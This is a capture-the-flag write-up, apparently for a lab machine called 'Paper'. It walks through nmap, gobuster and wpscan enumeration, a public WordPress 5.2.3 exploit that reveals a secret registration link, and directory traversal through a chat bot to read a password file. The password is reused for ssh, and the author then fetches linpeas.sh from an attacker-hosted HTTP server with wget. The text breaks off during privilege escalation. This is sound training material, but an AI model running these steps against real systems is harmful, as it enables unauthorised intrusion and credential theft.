## Enumeration

### Nmap

Let's start scanning the box with nmap:
```bash
nmap -sC -sV -A ip_address
```

![nmap](nmap.png)

Since this is the first time I'm using nmap in a write-up, I'll provide a more detailed explanation. The `-A` flag is used for OS and version detection, script scanning, and traceroute, while `-sC` performs a script scan using the default set of scripts, and `-sV` is used for version scanning.

From the nmap output, we can see that the server has three open ports: 22, 80, and 443. While we need to inspect the webpage further, we've already noticed something strange from the nmap scan: the `TRACE` HTTP method is allowed. If [Cross Site Tracing](https://owasp.org/www-community/attacks/Cross_Site_Tracing)

### Web server
If we take a look at the port 80, there is a default page from apache hosted on CentOS.

![Web Page](image1.png)

At this point we can try to enumerate further with gobuster and intercept the HTTP request with burpusite to see if we can get something interesting.
Gobuster didn't find anything whereas burpsuite did:

![Burpsuite](Burpsuite.png)

In the response header there is a field `X-Backend-Server: office.paper`.

Let's add it in the `/etc/hosts`.

We can now navigate to `office.paper`:

![Web Page](officepaper.png)

Now we can enumerate this new webapp with gobuster again, using it not only for the directories search but for the virtual hosts too:
```bash
gobuster dir -u office.paper -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![Gobuster dir](gobuster.png)

From the gobuster output we see it is a wordpress site.

```bash
gobuster vhost -u office.paper -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```
![Gobuster vhost](vhost.png)
So we have a subdomain `chat.office.paper`, let's add it too in the `/etc/hosts` file.
![Chat webpage](chat.png)
It looks like we need a secret registration URL, but we don't have it.
Before trying to bypass this login form I would like to try a `wpscan` as we have seen before it is a wordpress site.
```bash
wpscan --url office.paper
```

![wpscan](wpcan.png)

Wpscan has found a wordpress version 5.2.3 which is insecure, let's try to search if there is some exploit for it.
Indeed:
[https://www.exploit-db.com/exploits/47690](https://www.exploit-db.com/exploits/47690).
Trying this vulnerabilities on our site we found something interesting, a secret post with the registration link!

![registrationlink](registrationlink.png)

Now we can register and login in the chat, and looking a the general chat we see that there is a bot who can list and read files in the filesystem because the bot is vulnerable to directory traversal! This part is a lot CTFs like, so I'll go a bit faster. Enumerating the filesystem we can find a file  `../hubot/.env` with a password, now we can try this password to login via ssh with the users we can see in the `/etc/passwd`.

### User flag

```terminal
ssh dwight@office.paper

## Privilage Escalation

We now have several options, we can try to manually enumerate or we can run a script like `linPEAS` or `linenum`. Even if manually enumerate is really good as practice, on this machine I dont't recommend it. So, let's see if we have wget on the machine with `which wget`, we have it! we can now open a server on this machine with the `linpeas.sh` script and download it from the target machine.
On our machine let's move on the directory with `linpeas.sh` and run:
```bash
python -m http.server 2323
```
Let's download it from the target machine:
```bash
wget http://our_ip_address:2323/linpeas.sh
```
and after the download:
```terminal
[dwight@paper ~]$ wget http://$our_ip_address$:2323/linpeas.sh
